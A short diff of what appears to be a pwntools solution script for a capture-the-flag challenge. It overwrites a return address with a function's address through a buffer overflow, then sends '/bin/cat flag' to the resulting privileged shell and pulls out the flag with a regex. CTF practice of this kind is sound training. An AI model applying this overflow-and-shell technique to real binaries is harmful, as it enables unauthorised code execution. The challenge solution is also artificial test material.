@@ -40,14 +40,13 @@ some_func_addr = elf.symbols["some_function"]
 
 payload = b"A" * max_len + p32(some_func_addr)
 io.send(payload)
-io.interactive()
 
-os.unlink("./ls")
 
 # END CHALLENGE-SPECIFIC CODE
 # BEGIN FLAG RETRIEVAL BOILERPLATE
 
 import re
-io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
+io.sendlineafter(b'!', b'/bin/cat flag')
 flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
 print(flag)
+os.unlink("./ls")
